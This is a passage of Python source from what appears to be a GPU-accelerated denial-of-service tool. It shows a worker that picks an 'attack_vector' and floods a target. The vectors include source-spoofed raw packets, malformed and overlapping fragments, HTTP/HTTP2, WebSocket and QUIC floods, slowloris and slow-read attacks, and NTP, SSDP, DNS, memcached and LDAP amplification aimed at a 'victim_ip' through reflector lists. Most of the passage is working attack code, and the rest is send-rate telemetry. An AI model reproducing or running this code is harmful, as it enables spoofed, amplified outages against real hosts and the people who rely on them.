                    packets_gpu_array, packet_size = gpu_packet.generate_stateful_packets(
                        templates_bytes_list=template_pool,
                        count=args['count'],
                        target_ip=args['target'],
                        spoof_ip=args['spoof'],
                        real_src_ip=local_ip,
                        has_ethernet=True,
                        stream=stream_ring[stream_idx],
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8'),
                        seq_list=seq_list,
                        ack_list=ack_list,
                        state_list=state_list,
                        actual_lengths=actual_lengths,
                        specific_src_port=start_port,
                        window_sizes=win_list,
                        mss_values=mss_list,
                        ttls=ttl_list
                    )
                    current_batch = {
                        "cpu": _gpu_to_host(
                            packets_gpu_array,
                            f"stateful_slot{stream_idx}",
                            stream=stream_ring[stream_idx],
                            blocking=False,
                        ),
                        "count": args['count'],
                        "stream": stream_ring[stream_idx],
                        "slot": stream_idx,
                        "ready_event": cp.cuda.Event(),
                    }
                    current_batch["ready_event"].record(current_batch["stream"])
                    ready_queue.append(current_batch)
                    stream_idx = (stream_idx + 1) % 3

                    if len(ready_queue) >= 2:
                        send_batch = ready_queue.pop(0)
                        await _await_cuda_event(send_batch["ready_event"])
                        send_stats = await senders.paced_raw_socket_sender(
                            packets_buffer=send_batch["cpu"],
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=send_batch["count"],
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        )
                        worker_stats = _add_stats(worker_stats, send_stats)
                        packets_sent += send_batch["count"]

                        # In stateful mode, we need to loop to allow handshakes to complete.
                        if args['count'] > 0 and time.time() - start_time > 5:
                            ready_queue = []
                            break

                    await asyncio.sleep(0.1)

                while ready_queue:
                    send_batch = ready_queue.pop(0)
                    await _await_cuda_event(send_batch["ready_event"])
                    send_stats = await senders.paced_raw_socket_sender(
                        packets_buffer=send_batch["cpu"],
                        target_ip=args['target'],
                        target_port=args['port'],
                        count=send_batch["count"],
                        verbose=args['verbose'],
                        pacing_config=pacing_cfg,
                        live_sent=sent_total,
                        live_errors=errors_total,
                        live_progress=progress
                    )
                    worker_stats = _add_stats(worker_stats, send_stats)
                return

            # --- ANOMALY MODE (GPU) ---
            if args['attack_vector'] == 'anomaly':
                from . import anomaly_packet
                log_info("Initializing GPU Anomaly Packet Engine...")
                
                gw_mac_str = get_gateway_mac(args['target'])
                gw_mac_int = mac_to_int(gw_mac_str)
                stream = numba_cuda.stream()
                
                anomaly_types = args.get('anomaly_types', None)
                anomaly_intensity = args.get('anomaly_intensity', 75)
                use_suite = args.get('anomaly_suite', False)
                
                if use_suite:
                    # Full suite: standard + overlapping frags + tiny frags
                    log_info("Using Full Anomaly Suite (standard + overlap + tiny)")
                    results = anomaly_packet.generate_full_anomaly_suite(
                        count=args['count'],
                        target_ip=args['target'],
                        target_port=args['port'],
                        real_src_ip=real_src_ip,
                        spoof_ip=args['spoof'],
                        has_ethernet=True,
                        anomaly_intensity=anomaly_intensity,
                        stream=stream,
                        gateway_mac=gw_mac_int,
                        spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                    )
                    stream.synchronize()
                    
                    for key, (buf, pkt_size) in results.items():
                        cpu_buf = _gpu_to_host(buf, f"anomaly_suite_{key}")
                        pkt_count = len(cpu_buf) // pkt_size
                        log_info(f"Sending {pkt_count} {key} packets (size={pkt_size})...")
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_buf,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=pkt_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                else:
                    # Check if fragment-type anomalies are requested
                    has_overlap = anomaly_types and 6 in anomaly_types
                    has_tiny = anomaly_types and 7 in anomaly_types
                    
                    # Filter out fragment types from standard kernel
                    std_types = anomaly_types
                    if std_types:
                        std_types = [t for t in std_types if t not in (6, 7)]
                    
                    # Standard anomaly packets
                    if std_types is None or len(std_types) > 0:
                        stream_ring_std = [
                            cp.cuda.Stream(non_blocking=True),
                            cp.cuda.Stream(non_blocking=True),
                            cp.cuda.Stream(non_blocking=True),
                        ]
                        std_idx = 0
                        std_ready_queue = []
                        std_remaining = args['count']
                        std_batch_size = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))

                        while std_remaining > 0:
                            std_count = min(std_remaining, std_batch_size)
                            packets_gpu, pkt_size = anomaly_packet.generate_anomaly_packets(
                                count=std_count,
                                target_ip=args['target'],
                                target_port=args['port'],
                                anomaly_types=std_types if std_types else None,
                                real_src_ip=real_src_ip,
                                spoof_ip=args['spoof'],
                                has_ethernet=True,
                                anomaly_intensity=anomaly_intensity,
                                stream=stream_ring_std[std_idx],
                                gateway_mac=gw_mac_int,
                                spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                            )
                            std_current = {
                                "cpu": _gpu_to_host(
                                    packets_gpu,
                                    f"anomaly_std_slot{std_idx}",
                                    stream=stream_ring_std[std_idx],
                                    blocking=False,
                                ),
                                "count": std_count,
                                "stream": stream_ring_std[std_idx],
                                "slot": std_idx,
                                "ready_event": cp.cuda.Event(),
                            }
                            std_current["ready_event"].record(std_current["stream"])
                            std_ready_queue.append(std_current)
                            std_idx = (std_idx + 1) % 3
                            std_remaining -= std_count

                            if len(std_ready_queue) >= 2:
                                std_send = std_ready_queue.pop(0)
                                await _await_cuda_event(std_send["ready_event"])
                                worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                                    packets_buffer=std_send["cpu"],
                                    target_ip=args['target'],
                                    target_port=args['port'],
                                    count=std_send["count"],
                                    verbose=args['verbose'],
                                    pacing_config=pacing_cfg,
                                    live_sent=sent_total,
                                    live_errors=errors_total,
                                    live_progress=progress
                                ))

                            await asyncio.sleep(0)

                        while std_ready_queue:
                            std_send = std_ready_queue.pop(0)
                            await _await_cuda_event(std_send["ready_event"])
                            worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                                packets_buffer=std_send["cpu"],
                                target_ip=args['target'],
                                target_port=args['port'],
                                count=std_send["count"],
                                verbose=args['verbose'],
                                pacing_config=pacing_cfg,
                                live_sent=sent_total,
                                live_errors=errors_total,
                                live_progress=progress
                            ))
                    
                    # Overlapping fragments if requested
                    if has_overlap:
                        frag_buf, pair_size = anomaly_packet.generate_overlapping_fragments(
                            count=args['count'] // 2 or 1,
                            target_ip=args['target'],
                            target_port=args['port'],
                            real_src_ip=real_src_ip,
                            spoof_ip=args['spoof'],
                            has_ethernet=True,
                            stream=stream,
                            gateway_mac=gw_mac_int,
                            spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                        )
                        stream.synchronize()
                        cpu_frags = _gpu_to_host(frag_buf, "anomaly_overlap")
                        frag_count = len(cpu_frags) // pair_size
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_frags,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=frag_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                    
                    # Tiny fragments if requested
                    if has_tiny:
                        tiny_buf, tiny_size = anomaly_packet.generate_tiny_fragments(
                            count=args['count'] // 2 or 1,
                            target_ip=args['target'],
                            target_port=args['port'],
                            real_src_ip=real_src_ip,
                            spoof_ip=args['spoof'],
                            has_ethernet=True,
                            stream=stream,
                            gateway_mac=gw_mac_int,
                            spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                        )
                        stream.synchronize()
                        cpu_tiny = _gpu_to_host(tiny_buf, "anomaly_tiny")
                        tiny_count = len(cpu_tiny) // tiny_size
                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
                            packets_buffer=cpu_tiny,
                            target_ip=args['target'],
                            target_port=args['port'],
                            count=tiny_count,
                            verbose=args['verbose'],
                            pacing_config=pacing_cfg,
                            live_sent=sent_total,
                            live_errors=errors_total,
                            live_progress=progress
                        ))
                
                return

            # Hybrid Mode: Create template POOL on CPU, replicate on GPU
            
            # Determine Pool Size
            if args['attack_vector'] in ["http", "http2"]:
                TEMPLATE_POOL_SIZE = 50
            else:
                TEMPLATE_POOL_SIZE = 10
                
            template_pool = []
            # log_info(f"Generating template pool of size {TEMPLATE_POOL_SIZE}...") # Avoid spamming logs per worker
            
            for _ in range(TEMPLATE_POOL_SIZE):
                pkt_config = packet.PacketConfig(
                    target_ip=args['target'], 
                    target_port=args['port'],
                    protocol=args['protocol'],
                    spoof=False, # Template doesn't need spoofing, GPU does it
                    payload=args['payloads'][0] if args['payloads'] else None,
                    tcp_flags=args['tcp_flags'],
                    ttl=args['ttl'],
                    tos=args['tos'],
                    window=args['window'],
                    fragment_enabled=args.get('fragment', False),
                    fragment_size=args.get('fragment_size', 800),
                    pad_size=args['pad'],
                    attack_vector=args['attack_vector']
                )
                
                template_pkt = packet.create_packet(pkt_config)
                
                # Handle Scapy layers
                # For TX_RING (L2 Zero-Copy), we MUST have an Ethernet header.
                # If Scapy didn't add one (it usually doesn't for L3), we add it manually.
                
                full_bytes = bytes(template_pkt)
                
                has_ether_in_bytes = (
                    len(full_bytes) >= 34 and 
                    (full_bytes[14] & 0xF0) == 0x40 and 
                    (full_bytes[0] & 0xF0) != 0x40
                )
                
                if not has_ether_in_bytes:
                    try:
                        iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
                        
                        if not gw_mac_bytes:
                            dst_mac_bytes = b'\xff\xff\xff\xff\xff\xff'
                            iface = "eth0"
                        else:
                            dst_mac_bytes = gw_mac_bytes

                        from scapy.all import get_if_hwaddr
                        try:
                            src_mac_str = get_if_hwaddr(iface)
                            clean_src_mac = src_mac_str.strip().replace(':', '').replace('-', '').replace(' ', '')
                            src_mac_bytes = bytes.fromhex(clean_src_mac)
                        except:
                            src_mac_bytes = b'\x00\x00\x00\x00\x00\x00'
                            
                        eth_type = b'\x08\x00'
                        ether_header = dst_mac_bytes + src_mac_bytes + eth_type
                        t_bytes = ether_header + full_bytes
                        
                    except Exception as e:
                        log_error(f"Failed to add Ether: {e}")
                        t_bytes = b'\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x08\x00' + full_bytes
                else:
                    t_bytes = full_bytes
                
                # Validate template
                is_ether_ip = len(t_bytes) >= 34 and (t_bytes[14] & 0xF0) == 0x40
                is_ip_only = len(t_bytes) >= 20 and (t_bytes[0] & 0xF0) == 0x40 and not is_ether_ip
                
                if not (is_ether_ip or is_ip_only):
                    log_error(f"[CRITICAL] Generated template: Invalid format!")
                    return
                
                check_offset = 14 if is_ether_ip else 0
                if (t_bytes[check_offset] & 0xF0) != 0x40:
                    log_error(f"[CRITICAL] Generated template: Invalid IP at offset {check_offset}")
                    return
                     
                template_pool.append(t_bytes)
            
            # Normalize template sizes (Critical for GPU memory alignment)
            if template_pool:
                target_size = len(template_pool[0])
                normalized_pool = []
                for t in template_pool:
                    if len(t) == target_size:
                        normalized_pool.append(t)
                    elif len(t) < target_size:
                        # Pad with zeros
                        normalized_pool.append(t + b'\x00' * (target_size - len(t)))
                    else:
                        # Truncate (Risk: might cut options, but keeps alignment)
                        normalized_pool.append(t[:target_size])
                template_pool = normalized_pool

            # Validate ALL templates
            for i, t in enumerate(template_pool):
                # Determine offset again
                chk_offset = 14 if (len(t) > 14 and t[0] != 0x45) else 0
                
                if len(t) <= chk_offset or (t[chk_offset] & 0xF0) != 0x40:
                    log_error(f"[CRITICAL] Template {i} is invalid! Len: {len(t)}, Byte{chk_offset}: 0x{t[chk_offset] if len(t)>chk_offset else 'N/A':02x}")
                    return

            # 2. CUDA Setup
            # NOTE: In some environments, CuPy stream objects are not accepted by
            # numba kernels (TypeError: Expected a Stream object... got Stream).
            # Use default stream path here for compatibility.
            gw_mac_str = get_gateway_mac(args['target'])
            gw_mac_int = mac_to_int(gw_mac_str)

            # 3. Process in batches
            BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
            total_count = args['count']
            remaining = total_count
            
            log_info(f"[Worker {worker_id}] GPU attack starting: {total_count} packets in batches of {BATCH_SIZE}")
            
            while remaining > 0:
                batch_count = min(remaining, BATCH_SIZE)
                
                # Update progress for generation phase
                # Note: We can split progress into 'generating' and 'sending', 
                # but for simplicity, we mark progress as packets are handed to the sender.
                
                gpu_res = gpu_packet.generate_packets_from_template_pool(
                    templates_bytes_list=template_pool,
                    count=batch_count,
                    target_ip=args['target'],
                    spoof_ip=args['spoof'],
                    real_src_ip=(args.get('spoof_ip') or utils.get_local_ip()),
                    specific_src_port=args.get('source_port', -1),
                    has_ethernet=True,
                    stream=None,
                    gateway_mac=gw_mac_int,
                    spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                )
                
                if gpu_res is None:
                    log_error("GPU packet generation failed.")
                    break
                    
                packets_gpu_array, packet_size = gpu_res
                remaining -= batch_count

                cpu_packets = _gpu_to_host(
                    packets_gpu_array,
                    "template_pool_slot0",
                    stream=None,
                    blocking=True,
                )

                batch_stats = await senders.paced_raw_socket_sender(
                    packets_buffer=cpu_packets,
                    target_ip=args['target'],
                    target_port=args['port'],
                    count=batch_count,
                    verbose=args['verbose'],
                    pacing_config=pacing_cfg,
                    live_sent=sent_total,
                    live_errors=errors_total,
                    live_progress=progress
                )
                worker_stats = _add_stats(worker_stats, batch_stats)

                await asyncio.sleep(0)

        elif args['attack_vector'] == "http":
            verify_ssl = (str(args['http_verify']).lower() != "false")
            worker_stats = _add_stats(worker_stats, await senders.http_app_sender(
                args['target'], args['port'], args['count'], args['http_concurrency'],
                args['http_method'], args['http_path'], args['payloads'], args['verbose'],
                scheme=args['http_scheme'], verify=verify_ssl, timeout_s=args['http_timeout'], retries=args['http_retries'],
                ssl_context=ssl_context,
                cookies=args.get('cookies'),
                user_agent=args.get('user_agent'),
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
        elif args['attack_vector'] == "http2":
            worker_stats = _add_stats(worker_stats, await senders.http2_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['http2_concurrency'],
                http_path=args['http_path'],
                http_method=args['http_method'],
                verbose=args['verbose'],
                scheme=args['http_scheme'],
                cookies=args.get('cookies'),
                user_agent=args.get('user_agent'),
                ssl_context=ssl_context,
                h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))

        elif args['attack_vector'] == "websocket":
            worker_stats = _add_stats(worker_stats, await senders.websocket_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['ws_concurrency'],
                ws_path=args['ws_path'],
                ws_message=args['ws_message'],
                verbose=args['verbose'],
                ssl_context=ssl_context,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))

        elif args['attack_vector'] == "quic":
            # QUIC uses UDP
            worker_stats = _add_stats(worker_stats, await senders.quic_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['quic_concurrency'],
                quic_path=args['quic_path'],
                quic_method=args['quic_method'],
                verbose=args['verbose'],
                ssl_context=ssl_context,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))

        elif args['attack_vector'] in ["slow-post", "slow-read", "slowloris"]:
            # Map slowloris to slow-read (effective resource exhaustion) or slow-post
            attack_type = args['attack_vector']
            if attack_type == "slowloris":
                attack_type = "slow-read" # Use slow-read logic for slowloris general vector

            verify_ssl = (str(args['http_verify']).lower() != "false")
            worker_stats = _add_stats(worker_stats, await senders.slow_attack_sender(
                target_ip=args['target'],
                target_port=args['port'],
                count=args['count'],
                concurrency=args['slowloris_concurrency'] if args['attack_vector'] == "slowloris" else args['http_concurrency'], 
                attack_type=attack_type,
                verbose=args['verbose'],
                ssl_context=ssl_context if verify_ssl else None,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
        elif args['attack_vector'] == "pcap-replay":
            # ── PCAP Replay Engine ──
            from . import pcap_replay as pcap_mod

            pcap_filter = pcap_mod.PcapFilterConfig(
                protocols=args.get('pcap_filter_proto'),
                src_ip=args.get('pcap_filter_src_ip'),
                dst_ip=args.get('pcap_filter_dst_ip'),
                src_port=args.get('pcap_filter_src_port'),
                dst_port=args.get('pcap_filter_dst_port'),
                min_len=int(args.get('pcap_filter_min_len', 0) or 0),
                max_len=int(args.get('pcap_filter_max_len', 0) or 0),
            )

            replay_cfg = pcap_mod.PcapReplayConfig(
                pcap_file=str(args.get('pcap_file', '')),
                timing_mode=str(args.get('pcap_timing', 'original')),
                speed_multiplier=float(args.get('pcap_speed', 1.0) or 1.0),
                target_rps=float(args.get('rps', 0) or 0),
                loops=int(args.get('pcap_loops', 1) or 1),
                target_ip_override=args.get('target'),
                target_port_override=args.get('port'),
                src_ip_override=args.get('pcap_src_ip_override'),
                src_port_override=args.get('pcap_src_port_override'),
                filter_cfg=pcap_filter,
                strip_ethernet=bool(args.get('pcap_strip_eth', False)),
                verbose=bool(args.get('verbose', False)),
                batch_size=int(args.get('pcap_batch_size', 512) or 512),
                max_packets=int(args.get('pcap_max_packets', 0) or 0),
            )

            log_info(f"[Worker {worker_id}] PCAP Replay başlatılıyor: {replay_cfg.pcap_file}")

            replay_result = await pcap_mod.replay_pcap(
                replay_cfg,
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress,
                pacing_config=pacing_cfg if pacing_cfg.pacing_mode != PacingMode.NONE else None,
            )
            worker_stats = _add_stats(worker_stats, replay_result)

        elif args['attack_vector'] in ["ntp-amp", "ssdp-amp", "dns-amp", "memcached-amp", "ldap-amp"]:
            worker_stats = _add_stats(worker_stats, await senders.amplification_sender(
                victim_ip=args['target'],
                count=args['count'],
                rps=args['rps'],
                reflector_file=args['reflector_file'],
                amp_type=args['attack_vector'],
                verbose=args['verbose'],
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
        else: # This is the CPU path for raw packets
            spoof_opts = packet.SpoofingOptions(
                mode=args['spoof_mode'],
                subnet=args['spoof_subnet'],
                list_file=args['spoof_list_file']
            )
            p_config = packet.PacketConfig(
                target_ip=args['target'],
                target_port=args['port'],
                protocol=args['protocol'],
                spoof=args['spoof'],
                spoof_opts=spoof_opts,
                payload=args['payloads'][0] if args['payloads'] else None,
                tcp_flags=args['tcp_flags'],
                ttl=args['ttl'],
                tos=args['tos'],
                window=args['window'],
                fragment_enabled=args.get('fragment', False),
                fragment_size=args.get('fragment_size', 800),
                pad_size=args['pad'],
                attack_vector=args['attack_vector'],
                dns_name=args['dns_name'],
                dns_qtype=args['dns_qtype'],
                dns_edns=args['dns_edns'],
                dns_recursive=not args['dns_nord']
            )
            worker_stats = _add_stats(worker_stats, await senders.packet_sender(
                packet_config=p_config,
                count=args['count'],
                delay=args['delay'],
                rps=args['rps'],
                jitter=args['jitter'],
                ramp=args['ramp'],
                verbose=args['verbose'],
                live_sent=sent_total,
                live_errors=errors_total,
                live_progress=progress
            ))
    except KeyboardInterrupt:
        worker_status = "interrupted"
    except Exception as e:
        worker_status = "failed"
        worker_error = f"{type(e).__name__}: {e}"
        log_error(f"[Worker {worker_id}] hata: {worker_error}")
    finally:
        _resource_monitor_stop = True
        try:
            _resource_monitor_task.cancel()
        except Exception:
            pass

        # Final resource snapshot before process teardown.
        try:
            _update_resource_stats(force=True)
        except Exception:
            pass

        # Restore original sender symbol for safety inside the process lifetime.
        try:
            senders.paced_raw_socket_sender = _orig_paced_sender
        except Exception:
            pass

        try:
            if int(worker_stats.get("attempted", 0) or 0) <= 0:
                worker_stats["attempted"] = int(args.get("count", 0) or 0)
            worker_stats["errors"] = max(
                int(worker_stats.get("errors", 0) or 0),
                max(0, int(worker_stats.get("attempted", 0) or 0) - int(worker_stats.get("sent", 0) or 0)),
            )

            # Pull GPU generation telemetry once per worker (if available).
            if _gpu_packet_mod is not None and hasattr(_gpu_packet_mod, "get_generation_telemetry"):
                try:
                    gtel = _gpu_packet_mod.get_generation_telemetry() or {}
                    worker_stats["gpu_template_h2d_copy_count"] = int(worker_stats.get("gpu_template_h2d_copy_count", 0) or 0) + int(gtel.get("gpu_template_h2d_copy_count", 0) or 0)
                    worker_stats["gpu_template_h2d_copy_bytes"] = int(worker_stats.get("gpu_template_h2d_copy_bytes", 0) or 0) + int(gtel.get("gpu_template_h2d_copy_bytes", 0) or 0)
                    worker_stats["gpu_rng_state_alloc_count"] = int(worker_stats.get("gpu_rng_state_alloc_count", 0) or 0) + int(gtel.get("gpu_rng_state_alloc_count", 0) or 0)
                    worker_stats["gpu_rng_state_reuse_count"] = int(worker_stats.get("gpu_rng_state_reuse_count", 0) or 0) + int(gtel.get("gpu_rng_state_reuse_count", 0) or 0)
                except Exception:
                    pass

            # Recompute bounded loss metrics at worker finalization.
            worker_stats = _recompute_loss_metrics(worker_stats)
        except Exception:
            pass

        # Derive worker_status from actual send results (don't blindly report "ok")
        if worker_status == "ok":
            _ws_sent = int(worker_stats.get("sent", 0) or 0)
            _ws_attempted = int(worker_stats.get("attempted", 0) or 0)
            _ws_errors = int(worker_stats.get("errors", 0) or 0)
            if _ws_attempted > 0 and _ws_sent == 0:
                worker_status = "failed"
                if not worker_error:
                    worker_error = f"0/{_ws_attempted} packets sent ({_ws_errors} errors)"
            elif _ws_attempted > 0 and _ws_errors > _ws_sent:
                worker_status = "degraded"
                if not worker_error:
                    worker_error = f"high error rate: {_ws_errors}/{_ws_attempted}"

        # NOTE:
        # Live counters are already streamed incrementally by sender functions
        # through live_progress/live_sent/live_errors. Adding worker_stats again
        # here causes double counting (e.g. >100% progress and inflated PPS).

        if run_events is not None:
            try:
                # Collect sender_path from last batch stats if available
                _sender_path = str(worker_stats.get("sender_path", "") or "").strip() or "unknown"
                _fallback_count = int(worker_stats.get("fallback_count", 0) or 0)
                _perm_errors = int(worker_stats.get("permission_error_count", 0) or 0)
                _buffer_copy_count = int(worker_stats.get("buffer_copy_count", 0) or 0)
                _buffer_copy_bytes = int(worker_stats.get("buffer_copy_bytes", 0) or 0)
                _buffer_reuse_hits = int(worker_stats.get("buffer_reuse_hits", 0) or 0)
                _eagain_retry_count = int(worker_stats.get("eagain_retry_count", 0) or 0)
                _partial_send_retry_count = int(worker_stats.get("partial_send_retry_count", 0) or 0)
                _txring_flush_call_count = int(worker_stats.get("txring_flush_call_count", 0) or 0)
                _txring_flush_error_count = int(worker_stats.get("txring_flush_error_count", 0) or 0)
                _txring_flush_eagain_count = int(worker_stats.get("txring_flush_eagain_count", 0) or 0)
                _txring_frame_wait_ns = int(worker_stats.get("txring_frame_wait_ns", 0) or 0)
                _txring_poll_count = int(worker_stats.get("txring_poll_count", 0) or 0)
                _flush_mode = str(worker_stats.get("flush_mode", "unknown") or "unknown")
                _txring_tp_packets = int(worker_stats.get("txring_tp_packets", 0) or 0)
                _txring_tp_drops = int(worker_stats.get("txring_tp_drops", 0) or 0)
                _txring_tp_freeze_q_cnt = int(worker_stats.get("txring_tp_freeze_q_cnt", 0) or 0)
                _txring_packet_version = int(worker_stats.get("txring_packet_version", 0) or 0)
                _txring_packet_version_name = str(
                    worker_stats.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
                )
                _host_tx_packets_delta = int(worker_stats.get("host_tx_packets_delta", 0) or 0)
                _host_tx_dropped_delta = int(worker_stats.get("host_tx_dropped_delta", 0) or 0)
                _host_tx_errors_delta = int(worker_stats.get("host_tx_errors_delta", 0) or 0)
                _softnet_dropped_delta = int(worker_stats.get("softnet_dropped_delta", 0) or 0)
                _softnet_time_squeeze_delta = int(worker_stats.get("softnet_time_squeeze_delta", 0) or 0)
                _wire_loss_est_packets = int(worker_stats.get("wire_loss_est_packets", 0) or 0)
                _wire_loss_est_pct = float(worker_stats.get("wire_loss_est_pct", 0.0) or 0.0)
                _wire_loss_raw_packets = int(worker_stats.get("wire_loss_raw_packets", 0) or 0)
                _wire_loss_raw_pct = float(worker_stats.get("wire_loss_raw_pct", 0.0) or 0.0)
                _wire_loss_estimation_capped = int(worker_stats.get("wire_loss_estimation_capped", 0) or 0)
                _txring_drop_ratio_pct = float(worker_stats.get("txring_drop_ratio_pct", 0.0) or 0.0)
                _txring_flush_error_ratio_pct = float(worker_stats.get("txring_flush_error_ratio_pct", 0.0) or 0.0)
                _txring_flush_eagain_ratio_pct = float(worker_stats.get("txring_flush_eagain_ratio_pct", 0.0) or 0.0)
                _gpu_template_h2d_copy_count = int(worker_stats.get("gpu_template_h2d_copy_count", 0) or 0)
                _gpu_template_h2d_copy_bytes = int(worker_stats.get("gpu_template_h2d_copy_bytes", 0) or 0)
                _gpu_rng_state_alloc_count = int(worker_stats.get("gpu_rng_state_alloc_count", 0) or 0)
                _gpu_rng_state_reuse_count = int(worker_stats.get("gpu_rng_state_reuse_count", 0) or 0)

                # Backlog peak from resource stats
                _backlog_peak = 0
                if resource_stats is not None:
                    try:
                        wstats = resource_stats.get(int(worker_id))
                        if isinstance(wstats, dict):
                            _backlog_peak = int(wstats.get("backlog", 0) or 0)
                    except Exception:
                        pass

                run_events.append(
                    {
                        "worker_id": int(worker_id),
                        "attack_vector": str(args.get("attack_vector", "unknown")),
                        "compute_backend": str(backend_used),
                        "protocol": str(args.get("protocol", "")),
                        "target": str(args.get("target", "")),
                        "count_cfg": int(args.get("count", 0) or 0),
                        "status": worker_status,
                        "error": worker_error,
                        "duration_s": float(max(0.0, time.time() - worker_started)),
                        "stats": dict(worker_stats),
                        "sender_path": _sender_path,
                        "fallback_count": _fallback_count,
                        "permission_error_count": _perm_errors,
                        "buffer_copy_count": _buffer_copy_count,
                        "buffer_copy_bytes": _buffer_copy_bytes,
                        "buffer_reuse_hits": _buffer_reuse_hits,
                        "eagain_retry_count": _eagain_retry_count,
                        "partial_send_retry_count": _partial_send_retry_count,
                        "txring_flush_call_count": _txring_flush_call_count,
                        "txring_flush_error_count": _txring_flush_error_count,
                        "txring_flush_eagain_count": _txring_flush_eagain_count,
                        "txring_frame_wait_ns": _txring_frame_wait_ns,
                        "txring_poll_count": _txring_poll_count,
                        "flush_mode": _flush_mode,
                        "txring_tp_packets": _txring_tp_packets,
                        "txring_tp_drops": _txring_tp_drops,
                        "txring_tp_freeze_q_cnt": _txring_tp_freeze_q_cnt,
                        "txring_packet_version": _txring_packet_version,
                        "txring_packet_version_name": _txring_packet_version_name,
                        "host_tx_packets_delta": _host_tx_packets_delta,
                        "host_tx_dropped_delta": _host_tx_dropped_delta,
                        "host_tx_errors_delta": _host_tx_errors_delta,
                        "softnet_dropped_delta": _softnet_dropped_delta,
                        "softnet_time_squeeze_delta": _softnet_time_squeeze_delta,
                        "wire_loss_est_packets": _wire_loss_est_packets,
                        "wire_loss_est_pct": _wire_loss_est_pct,
                        "wire_loss_raw_packets": _wire_loss_raw_packets,
                        "wire_loss_raw_pct": _wire_loss_raw_pct,
                        "wire_loss_estimation_capped": _wire_loss_estimation_capped,
                        "txring_drop_ratio_pct": _txring_drop_ratio_pct,
                        "txring_flush_error_ratio_pct": _txring_flush_error_ratio_pct,
                        "txring_flush_eagain_ratio_pct": _txring_flush_eagain_ratio_pct,
                        "gpu_template_h2d_copy_count": _gpu_template_h2d_copy_count,
                        "gpu_template_h2d_copy_bytes": _gpu_template_h2d_copy_bytes,
                        "gpu_rng_state_alloc_count": _gpu_rng_state_alloc_count,
                        "gpu_rng_state_reuse_count": _gpu_rng_state_reuse_count,
                        "queue_backlog_peak": _backlog_peak,
                    }
                )
            except Exception:
                pass
        log_info(f"[Worker {worker_id}] görevini tamamladı. status={worker_status}")
